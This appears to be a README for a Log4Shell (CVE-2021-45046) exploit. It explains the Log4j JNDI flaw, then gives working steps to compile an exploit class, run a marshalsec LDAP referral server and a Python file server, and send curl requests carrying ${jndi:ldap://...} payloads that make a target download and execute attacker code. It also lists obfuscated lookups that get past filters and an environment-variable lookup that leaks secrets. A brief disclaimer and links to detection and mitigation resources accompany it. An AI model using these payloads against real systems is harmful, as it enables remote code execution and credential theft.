###Use this information only for learning, testing your own systems, with permission or to fix your stuff. Do not attack machines you do now have permission to.

#CVE-2021-45046

Vulnerable software:
Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0

Log4j recursively expands certain strings when it logs them.
Log4j expands JNDI (java naming and directory interface) strings, which allow LDAP (directory service) requests
An attacker may set up an LDAP service that response with a referrer. JNDI will then happily download the referred to class file from the specified source and execute the code inside of it. The attacker may compile his own java code and serve it with a web server.

So long as an attacker is able to make the target log a specifically crafted string with a vulnerable log4j library, he can execute arbitrary code.
Because the strings are expanded recursively, filtering is easily bypassed.

#Setup:

compile with compatible java version for target. example:

```bash
/usr/lib/jvm/java-8-openjdk-amd64/bin/javac Exploit.java
```

run ldap referrer server (https://github.com/mbechler/marshalsec)

```bash
export IP="ip.of.attacker.machine"      # ip of the python http web server
export PYPORT="8000"                    # port for python simple http server
export LDAPPORT="1389"                  # optional, port to bind the ldap server to
java -cp /home/paul/repositories/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$IP:$PYPORT/#Exploit" $LDAPPORT
```

run python web server to host the `.class` files

```bash
python -m http.server $PYPORT
```

then somehow make the target log this string with a vulnerable log4j

```text
${jndi:ldap://ip.of.attacker.machine:ldapport/Exploit}
```

```bash
curl 'http://target.tld/solr/admin/cores?foo=$\{jndi:ldap://ip.of.attacker.machine:ldapport/Exploit\}'
```


#Bypasses

Since Log4j does recursive string expansion, simply filtering for "jndi" for example will not work.

```text
${env:ENV_NAME:-j}
${upper:n}
${lower:d}
${::-i}
```

```bash
curl 'http://target.tld/vulnerable/uri/endpoit/loggin/query/parameters?bar=$\{$\{upper:j\}$\{::-n\}$\{upper:d\}$\{lower:i\}:ldap://attacker.ip:1389/Exploit\}'
```

for example results in "j"
we can use this method to build the whole string.

Also marshalsec can do RMI protocol.
Simply start with `marshalsec.jndi.RMIRefServer`, and instead of `ldap://` use `rmi://` in the exploit string

#Other stuff
log4j can expand arbitrary environment variables
even without RCE this can be bad.

```text
${env:SECRET_API_KEY}
```

if you can get your hands on the log files somehow, even without RCE, you can extract information

#More resources
##General
https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/
https://github.com/YfryTchsGD/Log4jAttackSurface
https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
https://log4shell.huntress.com/
https://www.youtube.com/watch?v=7qoPDq41xhQ

##Detection
https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes
https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d
https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228
https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1
https://github.com/darkarnium/CVE-2021-44228

##Mitigation
Consult your software distributor. Generally: Update log4j.

